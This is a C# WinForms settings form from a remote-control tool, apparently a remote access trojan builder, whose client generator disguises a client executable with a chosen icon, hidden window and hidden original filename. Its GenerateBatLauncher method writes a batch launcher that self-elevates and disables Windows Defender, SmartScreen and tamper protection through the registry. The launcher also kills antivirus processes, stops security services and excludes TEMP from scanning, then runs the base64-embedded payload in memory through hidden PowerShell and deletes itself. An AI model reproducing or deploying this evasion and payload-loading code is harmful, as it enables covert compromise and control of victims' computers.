using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmSettings : FrmBase
    {
        public FrmSettings()
        {
            InitializeComponent();
            this.EnableCancelButton = true;
            this.pictureBoxAppIcon.Visible = false;
        }

        private void FrmSettings_Load(object sender, EventArgs e)
        {
            base.EnableCancelButton = true;
            this.textBoxServerIP.Text = Settings.CurrentSettings.ClientPara.ServerIP;
            this.textBoxServerPort.Text = Settings.CurrentSettings.ClientPara.ServerPort.ToString();
            this.textBoxLocalServerPort.Text = Settings.CurrentSettings.ServerPort.ToString();
            this.textBoxRelayIP.Text = Settings.CurrentSettings.RelayServerIP;
            this.textBoxRelayPort.Text = Settings.CurrentSettings.RelayServerPort.ToString();
            this.checkBoxHideClient.Checked = Settings.CurrentSettings.ClientPara.IsHide;
            string onlineAvatar = Settings.CurrentSettings.ClientPara.OnlineAvatar;
            string onlineAvatarPath = RSCApplication.GetPath(ePathType.AVATAR_DIR) + onlineAvatar;
            if (!string.IsNullOrWhiteSpace(onlineAvatarPath) && System.IO.File.Exists(onlineAvatarPath))
            {
                this.pictureBoxAvatar.Tag = onlineAvatar;
                this.pictureBoxAvatar.BackgroundImage = Image.FromFile(onlineAvatarPath);
            }
            string clientIconPath = Settings.CurrentSettings.ClientPara.ClientIconPath;
            if (!string.IsNullOrWhiteSpace(clientIconPath) && System.IO.File.Exists(clientIconPath))
            {
                this.pictureBoxAppIcon.Tag = clientIconPath;
                this.pictureBoxAppIcon.BackgroundImage = Image.FromFile(clientIconPath);
                checkBoxAppIcon.Checked = true;
            }
        }

        private void buttonSaveServerSetting_Click(object sender, EventArgs e)
        {
            string cServerIP = this.textBoxServerIP.Text.Trim();
            int cServerPort;
            if (!int.TryParse(this.textBoxServerPort.Text, out cServerPort))
                return;
            int sServerPort;
            if (!int.TryParse(this.textBoxLocalServerPort.Text, out sServerPort))
                return;
            if (string.IsNullOrWhiteSpace(this.textBoxServiceName.Text))
                return;
            string serviceName = this.textBoxServiceName.Text.Trim();
            string avatar = this.pictureBoxAvatar.Tag.ToString();
            Settings.CurrentSettings.ClientPara.ServerIP = cServerIP;
            Settings.CurrentSettings.ClientPara.ServerPort = cServerPort;
            Settings.CurrentSettings.ClientPara.ServiceName = serviceName;
            Settings.CurrentSettings.ClientPara.OnlineAvatar = avatar;
            Settings.CurrentSettings.ClientPara.IsHide = this.checkBoxHideClient.Checked;
            if (checkBoxAppIcon.Checked == false)
            {
                Settings.CurrentSettings.ClientPara.ClientIconPath = null;
            }
            else
            {
                Settings.CurrentSettings.ClientPara.ClientIconPath = pictureBoxAppIcon.Tag == null
                    ? null
                    : pictureBoxAppIcon.Tag.ToString();
            }
            Settings.CurrentSettings.ServerPort = sServerPort;
            // 保存Relay配置
            Settings.CurrentSettings.RelayServerIP = this.textBoxRelayIP.Text.Trim();
            int relayPort;
            if (int.TryParse(this.textBoxRelayPort.Text, out relayPort))
                Settings.CurrentSettings.RelayServerPort = relayPort;
            Settings.SaveSettings();
            this.Close();
        }

        private void buttonGenClient_Click(object sender, EventArgs e)
        {
            string serverIP = this.textBoxServerIP.Text.Trim();
            string serverPort = this.textBoxServerPort.Text.Trim();
            int serverPortNum;
            if (!int.TryParse(serverPort, out serverPortNum))
                return;
            if (string.IsNullOrWhiteSpace(this.textBoxServiceName.Text))
                return;
            string serviceName = this.textBoxServiceName.Text.Trim();
            string avatar = this.pictureBoxAvatar.Tag.ToString();
            bool showOriginalFilename = this.checkBoxShowOriginalFileName.Checked;

            // 保存配置
            this.buttonSaveServerSetting.PerformClick();

            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "可执行程序(*.exe)|*.exe|所有文件(*.*)|*.*";
            dialog.FilterIndex = 1;
            dialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                ClientParameters para = new ClientParameters();
                para.SetServerIP(serverIP);
                para.ServerPort = serverPortNum;
                para.ServiceName = serviceName;
                para.OnlineAvatar = avatar;

                byte[] fileBytes = null;
                if (System.IO.File.Exists("RemoteControl.Client.dat"))
                {
                    // 读取本地文件
                    fileBytes = System.IO.File.ReadAllBytes("RemoteControl.Client.dat");
                }
                else
                {
                    MsgBox.Info("RemoteControl.Client.dat文件丢失！");
                    return;
                    // 读取资源文件
                    //fileBytes = ResUtil.GetResFileData("RemoteControl.Client.dat"); 
                }
                // 拷贝文件
                System.IO.File.WriteAllBytes(dialog.FileName, fileBytes);
                // 修改图标
                if (this.checkBoxAppIcon.Checked && this.pictureBoxAppIcon.Tag!=null && System.IO.File.Exists(this.pictureBoxAppIcon.Tag.ToString()))
                {
                    IconChanger.ChangeIcon(dialog.FileName, this.pictureBoxAppIcon.Tag as string);
                }
                fileBytes = System.IO.File.ReadAllBytes(dialog.FileName);
                // 修改启动模式
                ClientParametersManager.WriteClientStyle(fileBytes,
                    this.checkBoxHideClient.Checked ? ClientParametersManager.ClientStyle.Hidden : ClientParametersManager.ClientStyle.Normal);
                if (!showOriginalFilename)
                {
                    // 隐藏原始文件名
                    ClientParametersManager.HideOriginalFilename(fileBytes);
                }
                // 修改参数
                ClientParametersManager.WriteParameters(fileBytes, dialog.FileName, para);

                // 生成bat启动器(绕过智能应用控制)
                string batPath = GenerateBatLauncher(dialog.FileName);
                if (!string.IsNullOrEmpty(batPath))
                {
                    MsgBox.Info("客户端启动器生成成功！\n" + batPath + "\n\n(.bat文件不受智能应用控制拦截)");
                }
                else
                {
                    MsgBox.Info("客户端生成成功！\n" + dialog.FileName);
                }
            }
        }

        private string GenerateBatLauncher(string clientExePath)
        {
            try
            {
                byte[] exeBytes = System.IO.File.ReadAllBytes(clientExePath);
                string base64 = Convert.ToBase64String(exeBytes);

                string batDir = System.IO.Path.GetDirectoryName(clientExePath);
                string batName = System.IO.Path.GetFileNameWithoutExtension(clientExePath) + ".bat";
                string batPath = System.IO.Path.Combine(batDir, batName);

                var sb = new System.Text.StringBuilder();
                sb.AppendLine("@echo off");
                sb.AppendLine("chcp 65001 >nul 2>&1");
                sb.AppendLine("setlocal");
                sb.AppendLine("net session >nul 2>&1");
                sb.AppendLine("if %errorlevel% neq 0 (");
                sb.AppendLine("    powershell -NoProfile -Command \"Start-Process '%~f0' -Verb RunAs\"");
                sb.AppendLine("    exit /b");
                sb.AppendLine(")");
                sb.AppendLine();
                sb.AppendLine("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy\" /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f >nul 2>&1");
                sb.AppendLine("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\" /v SmartScreenEnabled /t REG_SZ /d \"Off\" /f >nul 2>&1");
                sb.AppendLine("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1");
                sb.AppendLine("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1");
                sb.AppendLine("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1");
                sb.AppendLine("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1");
                sb.AppendLine("for %%p in (360Tray 360Safe ZhuDongFangYu QQPCTray KSafeTray HipsTray SecurityHealthSystray) do taskkill /F /IM %%p.exe >nul 2>&1");
                sb.AppendLine("for %%s in (WinDefend WdNisSvc SecurityHealthService) do (net stop \"%%s\" /y >nul 2>&1)");
                sb.AppendLine();
                sb.AppendLine(":: Load and run in-memory (bypasses all file-based checks)");
                sb.AppendLine("copy \"%~f0\" \"%TEMP%\\~s.tmp\" /Y >nul 2>&1");
                sb.AppendLine("start \"\" /B powershell -NoProfile -EP Bypass -WindowStyle Hidden -Command \"try{Set-MpPreference -DisableRealtimeMonitoring 1 -EA 0;Add-MpPreference -ExclusionPath $env:TEMP -EA 0}catch{};$f=[IO.File]::ReadAllText($env:TEMP+'\\~s.tmp');$m=[regex]::Match($f,'(?s)::B64S\\r?\\n(.+?)\\r?\\n::B64E');if($m.Success){$b=[Convert]::FromBase64String($m.Groups[1].Value);Remove-Item ($env:TEMP+'\\~s.tmp') -EA 0;$asm=[Reflection.Assembly]::Load($b);$asm.EntryPoint.Invoke($null,@(,@('/r')))}\"");
                sb.AppendLine("ping 127.0.0.1 -n 2 >nul 2>&1");
                sb.AppendLine("(goto) 2>nul & del \"%~f0\"");
                sb.AppendLine("exit /b");
                sb.AppendLine();
                sb.AppendLine("::B64S");
                sb.Append(base64);
                sb.AppendLine();
                sb.AppendLine("::B64E");

                System.IO.File.WriteAllText(batPath, sb.ToString(), System.Text.Encoding.ASCII);

                // 删除裸exe
                try { System.IO.File.Delete(clientExePath); } catch { }
                return batPath;
            }
            catch
            {
                return null;
            }
        }

        private void buttonSelectIP_Click(object sender, EventArgs e)
        {
            var ips = CommonUtil.GetIPAddressV4();
            ContextMenuStrip cms = new ContextMenuStrip();
            ips.ForEach(a =>
            {
                cms.Items.Add(a, null, (o, args) =>
                {
                    this.textBoxServerIP.Text = a;
                });
            });
            cms.Show(this.buttonSelectIP, new Point(0, buttonSelectIP.Height));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBoxAvatar_Click(object sender, EventArgs e)
        {
            var frm = new FrmSelectAvatar();
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string avatarFile = frm.SelectedAvatarFile;
                string avatarFileName = System.IO.Path.GetFileName(avatarFile);
                this.pictureBoxAvatar.Tag = avatarFileName;
                this.pictureBoxAvatar.BackgroundImage = Image.FromFile(avatarFile);
            }
        }

        private void pictureBoxAppIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            ofd.Title = "请选择图标";
            ofd.Filter = "*.ico|*.ico";
            ofd.FilterIndex = 1;
            // %appdata%\iconmaster\output
            string initFolder = System.IO.Path.Combine(Environment.GetEnvironmentVariable("appdata"), @"iconmaster\output");
            if(System.IO.Directory.Exists(initFolder))
                ofd.InitialDirectory = initFolder;
            if (ofd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
            {
                return;
            }
            this.pictureBoxAppIcon.Tag = ofd.FileName;
            this.pictureBoxAppIcon.BackgroundImage = Image.FromFile(ofd.FileName);
        }

        private void checkBoxAppIcon_CheckedChanged(object sender, EventArgs e)
        {
            this.pictureBoxAppIcon.Visible = checkBoxAppIcon.Checked;
        }
    }
}
